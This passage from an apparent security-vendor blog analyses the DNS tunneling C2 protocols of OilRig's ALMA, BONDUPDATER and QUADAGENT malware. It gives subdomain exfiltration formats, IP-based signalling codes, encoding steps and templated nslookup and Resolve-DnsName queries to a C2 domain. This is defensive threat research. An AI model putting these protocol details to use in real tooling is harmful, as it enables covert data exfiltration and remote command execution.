\u201c0-2D-2D\", which is no longer used but will be replaced by the following:\r\n\r\n0 \u2013 This will contain the number of DNS queries the Trojan will request to transmit the entire data.\r\n\r\n2D \u2013 This will contain 20 or less characters that represent 10-bytes of data from the exfiltrated file in hexadecimal format.\r\n\r\n2D \u2013 This will contain 16 or less characters that represent the first 8-bytes of the filename being exfiltrated in hexadecimal format.\r\n\r\nThe resulting structure for the data exfiltration queries is as follows:\r\n\r\n[random number between 1-9998]ID[unique identifier from MD5 hash of system information]-[number of requests needed to transfer data]-[20 characters or less for hexlified data]-[16 characters or less for hexlified filename].[c2 domain]\r\n\r\nFigure 17 and 18 show ALMA communicator exfiltrating data via the DNS tunnel. The two screenshots show the Trojan providing the number \u201c29\u201d, which is the total number of DNS queries it will issue to transmit all of the data. The string \u201c5F446E73496E6974\u201d appears in each of the subdomains, as it is the hexlified representation of the filename \u201c_DnsInit\u201d, which was the name of the batch script provided by the C2 server and executed by the Trojan. The two screenshots show the sequence number after the unique identifier \u201c8faa2150\u201d starting at \u201c1\u201d and incrementing up to \u201c29\u201d when transmitting the data to the C2 server.\r\nFigure 17. ALMA beginning the exfiltration of data to the C2 in the queried subdomains\r\n\r\nFigure 18. ALMA finishing the exfiltration of data to the C2 in the queried subdomains\r\n\r\nALMA dot\r\nThis variant of ALMA is very similar to the ALMA dash variant; however, the information sent to the C2 server and specific formatting of the data within the DNS tunneling protocol differ. In addition to the user name and ProductId gathered by the dash variant of ALMA, the dot variant also gathers the computer name and the serial number of \"\\\\.\\PhysicalDrive\" and concatenates the system information using an underscore (\"_\") to split up the fields. Like the dash variant, the dot variant generates the MD5 hash of the gathered information and uses it as a unique identifier, but instead of using a shortened version of this hash, the dot variant uses the entire MD5 hash as the unique identifier. The initial beacon to the C2 is structured slightly differently than the dash variant and results in drastically different subdomains, specifically having the following format:\r\n\r\n[random number between 1-9999999].MD5 hash for unique identifier].[sequence number].0.2D.2D.[c2 domain]\r\n\r\nFigure 19 shows a beacon generated by ALMA dot that contains a random number, the MD5 hash of the generated system specific data used as an identifier and a sequence number of 0.\r\nFigure 19. Beacon generated by ALMA dot\r\nTo receive data from the C2, the Trojan will process the IPv4 addresses within the answers to the DNS query. Like, the dash variant, the dot variant of ALMA uses the following two IP addresses to mark the beginning and end of the data transmission:\r\n\r\nStart \u2013 36.37.94.33 ($%^!)\r\n\r\nEnd \u2013 33.33.94.94 (!!^^)\r\n\r\nFigure 20 shows the ALMA dot variant using the same IPv4 address of \u201c36.37.94[.]33\u201d to mark the beginning of the data it will download from the C2 server, which in this case is the same batch script \u201c_DnsInit.bat\u201d as mentioned in the ALMA dash section.\r\n\r\n\r\nFigure 20. ALMA dot using DNS tunnel to download a batch script from the C2 server\r\nWhen exfiltrating data via the DNS tunnel, ALMA dot variant has a similar but different structure than the dash variant and can transmit three times the amount of data per request. The following structure shows that the dot variant exfiltrates 60 characters of hexlified data (30 bytes) and another 60 characters of hexlified data (30 bytes) that represents the filename that the data is exfiltrated from:\r\n\r\n[random number between 1-9999999](IDID|idid)[MD5 hash for unique identifier].[sequence number].[total count in sequence].[60 or less characters for hexlified data].[60 or less characters for hexlified filename].[c2 domain]\r\n\r\nFigure 21 shows the ALMA dot variant exfiltrating the results of the batch script downloaded by the C2 server in the previous figure. The figure shows the queries containing a sequence number that increases by one each query until it reaches 8, which is the value in the field in the subdomain that signifies the total number of queries in the sequence. The following field contains 60 characters that represent 30 bytes of hexlified data that the Trojan is sending to the C2. The last field in the subdomain is the hexadecimal string \u201c5F446E73496E69742E747874\u201d that decodes to \u201c_DnsInit.txt\u201d, which is the file that stored the results of the \u201c_DnsInit.bat\u201d script downloaded from the C2 server.\r\n\r\n\r\nFigure 21. ALMA dot sending the output of the batch script via the DNS tunnel\r\n\r\nBONDUPDATER\r\nOilRig has used the BONDUPDATER tool in its attack campaigns as far back as mid-2017 according to FireEye\u2019s research. There were two known variants of BONDUPDATER prior to our discovery of a new variant of BONDUPDATER delivered in a targeted attack on a Middle Eastern government organization in August 2018 that we blogged about here. The early variants of variants of BONDUPDATER used DNS A record queries for its DNS tunnel using the \u201cGetHostAddresses\u201d method in the System.Net.Dns class. The later variant of BONDUPDATER relied on raw sockets provided by the System.Net.Sockets.UdpClient class to issue both DNS A and TXT lookups to facilitate the DNS tunnel. The use of multiple DNS query types makes the two BONDUPDATER variants dramatically different, so we will describe each separately.\r\nEarly BONDUPDATER\r\nThe initial BONDUPDATER samples used DNS A queries exclusively to set up its communication tunnel with its C2 server. Depending on the sample, the subdomains generated by this variant of BONDUPDATER would differ slightly, but the overall purpose of this variant of BONDUPDATER is to use a DNS tunnel to download a new PowerShell and\/or VBScript script from the C2 to execute.\r\n\r\nThe initial BONDUPDATER variant issues a beacon in the form of a DNS A request to the C2 server. To build this beacon, the Trojan will create a subdomain that contains a random number, a sequence number and a unique system identifier. The Trojan will first create a unique system identifier by executing the \u201cwhoami\u201d command and using the first 12-characters of output as the identifier. The sequence number in the subdomain allows the Trojan to notify the C2 the offset within the data that it is requesting, which is \u201c000\u201d for the initial beacon. The Trojan uses the following structure for the initial beacon:\r\n\r\n&lt;random number between 10-99, 1-6 digits worth&gt;&lt;action value, \u201c0\u201d for beacon&gt;&lt;sequence number&gt;&lt;unique system identifier&gt;B007.&lt;C2 domain&gt;\r\n\r\nIf the C2 wishes to send data to the Trojan, it will respond with an IPv4 address within the answer that starts with \u201c24.125\u201d as the first two octets. The Trojan will treat the remaining two octets as characters that it will use as a filename to save the data provided by the C2. The Trojan will use the last character of the filename to determine how to handle the data provided by the C2. Table 4 shows the three values the Trojan will look for as the last digit of the filename (fourth octet of response to the beacon) and how the Trojan will handle the received data.\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nLast digit in Filename\r\nDescription\r\n\r\n\r\n0\r\nTreat data as PowerShell commands to execute\r\n\r\n\r\n1\r\nWrite data to &lt;filename&gt;.ps1\r\n\r\n\r\n2\r\nWrite data to &lt;filename&gt;.vbs\r\n\r\n\r\n\r\nTable 4. Commands run based on the trailing character in the filename\r\nFigure 22 shows the C2 responding with \u201c24.125.0[.]1\u201d, which instructs BONDUPDATER to create a file named \u201c01.ps1\u201d to save the data. If the C2 wishes to terminate the Trojan, it would respond to the beacon with an IPv4 answer of \u201c11.24.237[.]110\u201d.\r\n\r\n\r\nFigure 22. Original BONDUPDATER beacon and the C2 server responding with a filename and data within the IPv4 answers\r\nOnce it creates the file, BONDUPDATER will begin sending DNS queries to request IPv4 answers that it will treat as data. The Trojan will use the same query structure as the beacon, but will use an action value of \u201c1\u201d and begin incrementing the sequence number in the subdomain by 3 upon each request for data. The sequence number corresponds to the offset of the data that the C2 server will send, which it will transmit three bytes at a time within the first, second and third octets of the IPv4 address. The C2 will provide the current sequence number within the fourth octet of the IPv4 address, which echoes the sequence number back to the Trojan to confirm it is the correct data chunk. Figure 22 also shows the C2 providing IP addresses as answers to next two queries with the first three octets as data and the fourth octet as the sequence number, which the Trojan would save \u201cwhoami\u201d to the \u201c01.ps1\u201d file.\r\n\r\nIf the Trojan successfully downloads the data from the C2 server, it crafts another subdomain that it will query to notify the C2 of the successful data transfer. This subdomain is interesting as it includes the system specific identifier from the beacon, but also includes up to 25-bytes of hexadecimal bytes of the output from the \u201cwhoami\u201d command that was used to craft the unique system identifier. We believe that BONDUPDATER would use this structure to transmit data back to the C2 server if desired. The subdomain built for the notification query has the following structure:\r\n\r\n&lt;random number between 10-99, 5-10 digits worth&gt;4&lt;sequence number, always \u201c000\u201d&gt;&lt;unique system identifier&gt;B007.&lt;25-bytes of hexlified \u2018whoami\u2019 output&gt;.&lt;C2 domain&gt;\r\n\r\nFigure 23 shows BONDUPDATER notifying the C2 that it downloaded the data, but the figure also shows how the queries would look for data exfiltration.\r\n\r\n\r\nFigure 23. BONDUPDATER sending data to the C2\r\nThe BONDUPDATER Trojan does not run the downloaded PowerShell or VBScript files, instead it relies on the C2 responding to a subsequent beacon with an IPv4 within the answer that starts with \u201c24.125\u201d and the fourth octet containing a \u201c0\u201d. According to Table 4, BONDUPDATER would treat the downloaded data as a PowerShell command, which would allow the actor to run previously downloaded PowerShell and\/or VBScript files.\r\nUpdated BONDUPDATER\r\nThe updated BONDUPDATER that OilRig used in a 2018 attack on a Middle Eastern government organization had the same DNS tunneling protocol as the previously described variant, however, it could also use a different tunneling protocol that used a combination of DNS A and TXT queries for data transfer.\r\n\r\nThe updated BONDUPDATER uses the same DNS tunneling protocol using DNS A queries, specifically looking for an IPv4 address starting with \u201c24.125\u201d to get the filename to save the data to and \u201c11.24.237.110\u201d if the C2 wishes to terminate the Trojan. The updated BONDUPDATER also looks for an IPv4 address of \u201c99.250.250.199\u201d, which instructs the Trojan to begin using the alternate DNS tunnel that issues DNS TXT queries to transfer data.\r\n\r\nRegardless of which DNS tunneling protocol the Trojan uses, the subdomains crafted have a different structure from the previously known variant. As mentioned in our previous blog:\r\n\r\n\"The format of the generated domains for both sending and receiving starts with the previously generated GUID created to uniquely identify the system. However, the Trojan inserts a part number value and an action type character into this GUID string at random offsets. The part number value is a three-digit string that corresponds to the chunk of data the Trojan is attempting to transmit. The action type is a single character that notifies the C2 the type of communication the Trojan is carrying out. The two static characters \u201cC\u201d and \u201cT\u201d in the subdomain surround two digits, which help the C2 server find the part number and action type mixed in within the GUID string at random offsets.\"\r\n\r\nThe structure of the subdomains previously described is as follows, with the indexes for the part number and action representing a zero-based indexed string (0 is the first character of the string):\r\n\r\n&lt;GUID with part number and action character&gt;&lt;sequence number&gt;&lt;between 1 and 7 random characters&gt;C&lt;index of part number&gt;&lt;index of action&gt;T.&lt;C2 domain&gt;\r\n\r\nThe initial beacon from the Trojan to the C2 uses an action type of \u201cM\u201d and a part number of \u201c000\u201d, as the Trojan is not attempting to transmit any data. Figure 24 shows an example beacon sent from the BONDUPDATER to its C2 server, with the part number \u201c000\u201d at offset 7 and the action \u201cM\u201d at offset 4. It is important to note that if the index of the action is larger than the index of the part number, then the location of the action will be incorrect and will need the length of the part number (3) added to it to find the correct offset.\r\n\r\n\u00a0\r\nFigure 24. Updated BONDUPDATER\u2019s initial beacon and the C2 instructing Trojan to use TXT queries\r\nAs you can see in Figure 24, the C2 server responded to the beacon with the IPv4 address \u201c99.250.250[.]199\u201d to instruct BONDUPDATER to use the new TXT-based DNS tunnel. To obtain commands from the C2 server, BONDUPDATER will request a filename from the C2 server via a beacon that uses a DNS TXT query with \u201cW\u201d as the action value. BONDUPDATER will not only use this filename to write downloaded data to, but it will also use the trailing character of the filename as the command to run. Table 5 from our previous blog shows how the Trojan will use the trailing character of the provided filename to carry out specific activities.\r\n\r\n\r\n\r\nTrailing Character\/Command\r\nPurpose\r\nDescription\r\n\r\n\r\n0\r\nExecute command\r\nReads the contents of the file and runs them as a command with \u201ccmd.exe\u201d. The output of the command is saved to a file whose name starts with \u201cproc\u201d and is stored in the \u201csendbox\u201d folder, which the Trojan will send to the C2 server.\r\n\r\n\r\n1\r\nDownload file\r\nReads the contents of the file for a path to a file to download. Copies the specified file to a file in the \u201csendbox\u201d folder for the Trojan to send to the C2 server.\r\n\r\n\r\nAny other character\r\nUpload file\r\nUsed to store a file on the system. The file is moved to the \u201cdone\u201d folder, which stores the file for future use. The Trojan writes \u201c200&lt;&gt;[path to stored file]\u201d to a file in the \u201csendbox\u201d folder to notify the C2 that the file was downloaded successfully.\r\n\r\n\r\n\r\nTable 5. Commands available in BONDUPDATER and their purpose\r\n\u00a0The C2 server will respond to this DNS TXT query with TXT answers that start with an instruction that tells BONDUPDATER how to process the data. Table 6 from our previous blog shows the instructions that the Trojan will parse for within the TXT answer. A greater than (\u201c&gt;\u201d) character will immediately follow the instruction within the TXT answer, in which the Trojan will treat the characters that follow the greater than character as data.\r\n\r\n\r\n\r\nInstruction\r\nDescription\r\n\r\n\r\nN\r\nIdle. Set action type of next query to \u201cW\u201d\r\n\r\n\r\nS\r\nReceive data from C2. Decode data portion as base64. Sets the action type of future queries to the C2 to \u201cD\u201d.\r\n\r\n\r\nS000s\r\nUse data to as a portion of the filename to save data to. The data is appended to the string \u201crcvd\u201d, which will be saved in the \u201creceivebox\u201d folder. Sets the action type of future queries to the C2 to \u201cD\u201d.\r\n\r\n\r\nE\r\nWrite bytes provided by the \u201cS\u201d command to the file resulting from the \u201cS000s\u201d command. The breaks the loop for the script to process the downloaded file.\r\n\r\n\r\nC\r\nCancel communications by exiting the loop.\r\n\r\n\r\n\r\nTable 6. Instructions within the new data transfer process in BONDUPDATER and their meanings\r\nTo execute a command on the system, the C2 would respond to the \u201cW\u201d TXT beacon with the instruction \u201cS000s\u201d followed by the greater than (\u201c&gt;\u201d) character and a filename that ends in a character that ends in \u201c0\u201d. Figure 25 shows the BONDUPDATER issuing a request to obtain a filename from the C2 server by issuing a TXT query with the \u201cW\u201d action at offset 3 in the subdomain. The screenshot also shows the C2 responding to the query with \u201cS000s&gt;10100\u201d, which tells the Trojan to create a file named \u201crcvd10100\u201d, as the Trojan will append the provided filename to the string \u201crcvd\u201d.\r\n\r\n\u00a0\r\nFigure 25. BONDUPDATER requesting a filename to which to save downloaded data\r\n\u00a0With the filename obtained, the Trojan will begin issuing DNS TXT queries with an action of \u201cD\u201d to download data from the C2. The C2 server will respond to these requests with an instruction of \u201cS0000\u201d, followed by the first chunk of base64 encoded data that is the command. Figure 26 shows BONDUPDATER issuing a TXT query with the \u201cD\u201d action at offset 5 and the C2 server responding with the instruction of \u201cS0000\u201d and the encoded command of \u201cd2hvYW1pJmlwY29uZmlnIC9hbGw=\u201d for the command \u201cwhoami&amp;ipconfig \/all\u201d.\r\n\r\n\u00a0\r\nFigure 26. BONDUPDATER requesting data to download and the C2 providing base64 data\r\n\u00a0BONDUPDATER waits to receive an instruction from the C2 server that starts with \u201cE\u201d before writing the downloaded data to the supplied filename. After receiving the \u201cE\u201d instruction, the Trojan will write the base64 decoded data to the file and process the newly created file. Figure 27 shows the C2 server providing the \u201cE\u201d instruction within the TXT answer. In the current example, the Trojan would treat the newly saved file as a script thanks to the filename ending with the \u201c0\u201d character. The Trojan would run the contents of the file using \u201ccmd.exe\u201d and save the output to a file named \u201cproc10100\u201d that will be uploaded to the C2 server.\r\n\r\n\r\nFigure 27. BONDUPDATER C2 providing an instruction to tell the Trojan to write the data to the file\r\n\u00a0To upload data to the C2 server, the updated BONDUPDATER variant will use DNS A requests to transmit the data within the crafted subdomain. The structure of this subdomain differs from the DNS A and TXT requests meant to receive data, as these subdomains include segments for the filename and the data itself. To send data to the C2, the Trojan will issue DNS A queries to resolve domains with the following structure:\r\n\r\n\u00a0&lt;GUID with part number and action character of \u201c2\u201d&gt;&lt;sequence number&gt;&lt;between 1 and 7 random characters&gt;C&lt;index of part number&gt;&lt;index of action&gt;T.&lt;data chunk&gt;.&lt;filename&gt;.&lt;c2 domain&gt;\r\n\r\nWhen sending data to the C2, the Trojan will include the character \u201c2\u201d for the action to notify the C2 that it is going to send data. Both the data and filename segments of the subdomain are encoded using an encoding mechanism that takes the following steps:\r\n\r\n \tCreates two separate empty strings\r\n \tConverts each data byte to their hexadecimal form\r\n \tSplits each hexadecimal byte into two nibbles\r\n \tAppends the first nibble to the first string\r\n \tAppends the second nibble to the second string\r\n \tConcatenates the two strings together\r\n\r\nThis process effectively separates the two characters of each hexadecimal byte and spreads them out across the total string. The filename segment contains the encoded string for the filename with an asterisk (\u201c*\u201d) appended. For instance, the \u201c10100\u201d file seen in Figure 27 above will have an asterisk appended to it to produce \u201c10100*\u201d, which when encoded using this method results in a string of \u201c33333210100A\u201d. The following code block visualizes how this encoding method works:\u00a0\r\nString to encode: 10100*\r\n\r\nChar '1' is 31 in hex.\r\n\r\n\u00a0- Put '3' in string 1\r\n\r\n\u00a0- Put '1' in string 2\r\n\r\nChar '0' is 30 in hex.\r\n\r\n\u00a0- Put '3' in string 1\r\n\r\n\u00a0- Put '0' in string 2\r\n\r\nChar '1' is 31 in hex.\r\n\r\n\u00a0- Put '3' in string 1\r\n\r\n\u00a0- Put '1' in string 2\r\n\r\nChar '0' is 30 in hex.\r\n\r\n\u00a0- Put '3' in string 1\r\n\r\n\u00a0- Put '0' in string 2\r\n\r\nChar '0' is 30 in hex.\r\n\r\n\u00a0- Put '3' in string 1\r\n\r\n\u00a0- Put '0' in string 2\r\n\r\nChar '*' is 2A in hex.\r\n\r\n\u00a0- Put '2' in string 1\r\n\r\n\u00a0- Put 'A' in string 2\r\n\r\nConcat string 1 \u201c333332\u201d and string 2 \u201c10100A\u201d\r\n\r\nEncoded string: 33333210100A\r\nThe data segment of the subdomain can be a maximum of 60 characters long, so BONDUPDATER will split the data to exfiltrate into 30-byte chunks and encode the data using the same encoding method. To initiate the exfiltration of this file with the C2, BONDUPDATER will issue an initial DNS A query for a domain whose data chunk section starts with a hardcoded \u201cCOCTab\u201d string followed by an encoded string of data that contains the filename and the length of the encoded data that will be transmitted. For instance, the \u201c10100\u201d file used in our example stored 2795 bytes of output from the issued command, which results in 5590 bytes when encoded. The Trojan splits the filename and data size with an asterisk and uses asterisks as padding to create a 27-character string of\u00a0 \u201c10100*5590*****************\u201d, which results in an encoded string \u201c33333233332222222222222222210100A5590AAAAAAAAAAAAAAAAA\u201d. BONDUPDATER appends this encoded string to \u201cCOCTab\u201d and issues a DNS query using this as its data segment of the subdomain to notify the C2 how many DNS A requests it will issue to transmit the data. Figure 28 shows the initial notification query that contains the \u201c33333210100A\u201d string in the filename segment and the data segment containing the filename and data length string after \u201cCOCTab\u201d.\r\nFigure 28. BONDUPDATER query notifying the C2 that it will upload the contents of a file\r\nThe C2 server will respond to this DNS A request with an IPv4 address that contains the first two characters of the GUID used as the system identifier as the first octet, \u201c2\u201d and \u201c3\u201d as the second and third octet and the fourth octet containing a sequence number corresponding to the data chunk that the C2 server wishes the Trojan to send. BONDUPDATER will continue to send DNS A queries with chunks of encoded data from the file within the data segment of the subdomain until all of the data has been transmitted. Figure 29 shows the C2 server responding to the notification query and the following data transfer queries with the IPv4 addresses whose fourth octet increments by three to obtain the next chunk of data.\r\n\r\n\r\nFigure 29. BONDUPDATER transmitting data to the C2 in the queried subdomains\r\n\u00a0After sending all of the data, the Trojan will issue a final DNS query with \u201cCOCTabCOCT\u201d in the data segment. This query notifies the C2 server that the Trojan has finished sending the contents of the file. Figure 30 shows the continued data transfer via DNS queries, followed by the final DNS query with \u201cCOCTabCOCT\u201d within the data segment.\u00a0\r\nFigure 30. BONDUPDATER sending data and telling the C2 it is done via the \"COCTabCOCT\" string\r\n\r\nQUADAGENT\r\nOilRig has used the QUADAGENT tool in targeted attacks, one of which we publicly discussed in our blog titled OilRig Targets Technology Service Provider and Government Agency with QUADAGENT. QUADAGENT is capable of using DNS tunneling to communicate with its C2 server using DNS queries to resolve custom crafted subdomains of a C2 domain. The DNS tunneling protocol uses AAAA queries to transmit and receive data between the infected system and its C2 server. Depending on the version of Windows, the payload will use a different method to issue the queries, specifically:\r\n\r\nWindows 8+\r\n\r\nResolve-DnsName -Name &lt;generated subdomain&gt;.&lt;c2 domain&gt; -Type AAAA -DnsOnly\r\n\r\nWindows 7\r\n\r\nnslookup.exe -q=aaaa &lt;generated subdomain&gt;.&lt;c2 domain&gt;.\r\n\r\nIt appears that the author knew that PowerShell on Windows versions prior to Windows 8.1 did not have the DnsClient module that contains the Resolve-DnsName method. At a high level, QUADAGENT communicates with its C2 server to obtain a PowerShell script that it will replace itself with, which essentially updates the Trojan with a secondary payload. To carry out this updating functionality, QUADAGENT follows a sequence of steps that involves:\r\n\r\n \tObtaining a session identifier and pre-shared key\r\n \tConfirming the correct session identifier\r\n \tDownloading the PowerShell script\r\n \tConfirming the download and execution\r\n\r\nThe first step to set up communications between QUADAGENT and the C2 involves an initial handshake to obtain a session ID and pre-shared key. To obtain its session id and pre-shared key, the payload will issue a query to resolve the following domain, which acts as the initial beacon:\r\n\r\nmail.&lt;random number between 100000 and 999999&gt;.&lt;c2 name&gt;\r\n\r\nThis request is to notify the C2 server that the payload is about to send system specific data as part of the initial handshake. The system specific data sent to the C2 server is in the following format:\r\n\r\n&lt;domain&gt;\\&lt;username&gt;:pass\r\n\r\nThe above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (\"=\",\"\/\" and \"+\") from the data and replaces them with domain safe values (\"01\", \"02\" and \"03\" respectively). QUADAGENT will issue a DNS query to resolve a domain with the following structure to send this encoded system data to the C2:\r\n\r\n&lt;encoded system data&gt;.&lt;same random number between 100000 and 999999 above&gt;.&lt;c2 name&gt;\r\n\r\nThe C2 server will respond to these requests by providing a session identifier to uniquely identify the compromised system and pre-shared key encrypt data sent via the DNS tunnel. To transfer this data to QUADAGENT, the C2 server will respond to the last DNS query with an IPv6 address that contains a number that the Trojan will use to determine how many DNS requests it must issue to download the data from the C2 server. The C2 server will send the count value in the last two hexadectets of the IPv6 address in the answer to the query. Figure 31 shows QUADAGENT sending a query to notify the C2 that it will send system specific data in the following query. The C2 response has \u201c2\u201d in the last two hexadectets, which instructs the Trojan to issue two queries to download the desired data.\r\n\r\n\r\nFigure 31. Wireshark displaying beacon and transmission of system information between QUADAGENT and its C2\r\nTo receive the data, QUADAGENT will issue DNS requests to resolve subdomains of the C2 domain that start with \u201cwww\u201d followed immediately by a sequence number of the chunk of data the Trojan currently seeks. The Trojan will issue queries to resolve the domains with the following structure until it has reached the count value provided by the C2 in Figure 31:\r\n\r\nwww&lt;sequence number&gt;.&lt;random number between 100000 and 999999&gt;.&lt;c2 name&gt;\r\n\r\nAfter obtaining the data, QUADAGENT will issue a query to resolve a subdomain structured as follows to signal to the C2 server that it received all of the data:\r\n\r\nwww.&lt;random number between 100000 and 999999&gt;.&lt;c2 name&gt;\r\n\r\nFigure 32 shows QUADAGENT issuing DNS requests with incrementing sequence numbers and the C2 providing the session identifier and pre-shared key within the IPv6 answers. The screenshot also shows the Trojan sending a DNS query to notify the C2 that it successfully received the data.\r\n\r\n\r\nFigure 32. Wireshark displaying QUADAGENT downloading a session identifier and pre-shared key from C2\r\nQUADAGENT will then finish the handshake sequence by using its newly obtained session identifier in a series of queries. The Trojan will use a similar series of queries later on to exfiltrate data to the C2 later in its communications, but at this point in the communications QUADAGENT just uses them to echo the session identifier back to the C2. The payload starts this process by issuing a DNS query to resolve a domain with the following structure to notify the C2 that it is about to send data:\r\n\r\nns1.&lt;new random number between 100000 and 999999&gt;.&lt;c2 name&gt;\r\n\r\nQUADAGENT does nothing with the answer to the previous query, rather it immediately issues a query to resolve the following domain, which effectively transmits the session id value to the C2:\r\n\r\n&lt;session id&gt;.&lt;same random number between 100000 and 999999&gt;.&lt;c2 domain name&gt;\r\n\r\nOnce again, the payload disregards the answer to the query above. At this point, if QUADAGENT had data to the C2, it would encrypt the data and encode the ciphertext using the custom base64 function used to transmit the system information within the handshake. The Trojan would then send this encoded data within a sequence of queries that include 60 characters of the encoded ciphertext as the first portion of the subdomain. After completing the data transmission, QUADAGENT then issues one last query to resolve a domain with \u201cns2\u201d as the subdomain to notify the C2 server that it is done sending data. At this point in the communications, QUADAGENT does not have any data to send to the C2, as it is only echoing the session identifier so the Trojan issues a query to resolve a domain structured as follows:\r\n\r\nns2.&lt;same random number between 100000 and 999999&gt;.&lt;c2 domain name&gt;\r\n\r\nFigure 33 shows QUADAGENT sending the provided session identifier to the C2 server.\r\n\r\n\r\nFigure 33. Wireshark showing QUADAGENT echoing its session identifier back to the C2\r\nTo transmit the data via the DNS tunneling channel, the C2 server will respond to the previous query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers. This is the same process discussed earlier when the C2 server provided the session identifier and pre-shared key. Much like the data transfer method discussed earlier, QUADAGENT will issue DNS requests to resolve subdomains \u201cwww&lt;sequence number&gt;\u201d with the sequence number incrementing until it receives all the data. Once it receives all the data, the Trojan issues a query to resolve \u201cwww.\u201d to notify the C2 that it received all the data.\r\n\r\nThe C2 can respond to the query to resolve the \u201cns2.\u201d domain with pipe-delimited (\u201c|\u201d) data that QUADAGENT will parse and handle in one of two ways depending on fields provided. The Trojan will parse the two types of data and treat them as:\r\n\r\n \tA new session identifier and pre-shared key\r\n \tA command to overwrite the current script with a new PowerShell script to execute\r\n\r\nFirst, the C2 can provide data with a specific structure that QUADAGENT will treat as a new session identifier and pre-shared key. Much like the initial handshake, QUADAGENT will save this session identifier and pre-shared key to the registry so the Trojan does not have to carry out the handshake each time it executes. The C2 creates a string following structure and sending it to QUADAGENT as cleartext via IPv6 addresses in the \u201cwww&lt;sequence number&gt;\u201d query sequence:\r\n\r\n&lt;session identifier&gt;|&lt;length of pre-shared key&gt;|&lt;pre-shared key&gt;\r\n\r\nSecond, the C2 can provide data that QUADAGENT will treat as a command that it will parse looking for data to overwrite its current file with a new PowerShell script. The C2 provides this data by creating a string with the field before the first pipe (\u201c|\u201d) empty, the second field containing the length of the ciphertext and the third field starting with the 16-byte initialization vector (IV) followed by the data encrypted with AES using the previously mentioned IV and the pre-shared key. This data is sent to the Trojan via the \u201cwww&lt;sequence number&gt;\u201d query sequence in the following format:\r\n\r\n|&lt;length of encrypted data&gt;|&lt;AES IV&gt;&lt;Data encrypted with AES and pre-shared key&gt;\r\n\r\nFigure 34 shows the C2 server instructing QUADAGENT to issue 5 requests to download data. QUADAGENT issues these queries and increments the sequence number in each query. The C2 server provides answers to these queries with the length of the data, the 16-byte AES initialization vector and the data encrypted with AES using the pre-shared key.\r\n\r\n\r\nFigure 34. Wireshark displaying QUADAGENT downloading a command from the C2 server\r\nQUADAGENT will decrypt the data downloaded from the C2 server using AES with the provided IV and the previously provided pre-shared key. QUADAGENT will parse the decrypted data based on the following structure:\r\n\r\nhello&lt;char uuid[35]&gt;&lt;char type[1]&gt;&lt;data&gt;\r\n\r\nThe message will start with the string 'hello', followed by a 35 character UUID string. The 'type' field specifies the command that the payload will handle, which known QUADAGENT samples can only handle one command type 'x'. The 'x' command treats the supplied data field as a PowerShell script that it will write to the current PowerShell script, effectively overwriting the initial PowerShell script with a secondary payload.\r\n\r\nThe payload will then notify the C2 that it has successfully downloaded the secondary PowerShell payload. The payload creates a string that has the following structure that it will send to the C2:\r\n\r\nbye&lt;char uuid[35]&gt;d\r\n\r\nQUADAGENT will send the above string to the C2 using the sequence of DNS queries previously mentioned for data exfiltration. The sequence starts by first issuing a DNS query to resolve the following domain to notify the C2 that the payload will send data to it in subsequent DNS queries:\r\n\r\nns1.&lt;random number between 100000 and 999999&gt;.&lt;c2 name&gt;\r\n\r\nQUADAGENT will then issue a query to resolve a subdomain structured as follows, which contains the session identifier that notifies the C2 which host is about to send data:\r\n\r\n&lt;session id&gt;.&lt;same random number between 100000 and 999999&gt;.&lt;c2 domain name&gt;\r\n\r\nThe payload will then split the message up into 60-byte chunks, which it will send to the C2 via DNS queries to resolve domains structured as:\r\n\r\n&lt;encoded\/encrypted data of message&gt;.&lt;same random number between 100000 and 999999&gt;.&lt;c2 name&gt;\r\n\r\nThe payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured as:\r\n\r\nns2.&lt;same random number between 100000 and 999999&gt;.&lt;c2 name&gt;\r\n\r\nFigure 35 shows QUADAGENT uploading data to the C2 server as base64 encoded data within the queried subdomain. Before sending the data, the Trojan provides the notification query using the \u201cns1\u201d subdomain, followed by a query with the session identifier. Finally, QUADAGENT issues a query for the \u201cns2\u201d subdomain to notify the C2 that it is done sending data.\r\n\r\n\r\nFigure 35. Wireshark displaying QUADAGENT sending its \"bye\" message to the C2 server\r\n\r\nConclusion\r\nThe OilRig group has repeatedly used DNS tunneling as a channel to communicate between their C2 servers and many of their tools. As mentioned in our overview of DNS tunneling, this threat group saw the benefits of using DNS tunneling, as DNS is almost universally allowed through security devices. One major drawback of using DNS tunneling is the high volume of DNS queries issued to transmit data back and forth between the tool and the C2 server, which may stand out to those monitoring DNS activity on their networks.\r\n\r\nWhile all DNS tunneling protocols have to abide by the standardized DNS protocol, not all of the tunneling protocols used by OilRig are equal from an efficiency or blending in standpoint. Data transmission using these DNS tunnels uses specially crafted subdomains, which can transmit more data per query by designating more of the characters within the subdomain as data. It is also obvious that the use of base64 encoding is more efficient than base16 in these protocols, as each character of base64 encoded data can send .75 bytes of data whereas base16 requires two characters to send 1 byte. Regardless of the encoding, the extremely long subdomains used in some of these tunnels to transmit data may not blend into legitimate DNS query traffic.\r\n\r\nPalo Alto Networks customers interested in protecting themselves against DNS Tunneling attacks should investigate our DNS Security Service, which uses advanced techniques to identify and block DNS Tunneling attacks.\r\n\r\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org.\r\n\r\nIOCs\r\n\r\nWhile not an exhaustive list of samples, please reference the following SHA256 hashes for the various tools discussed in this 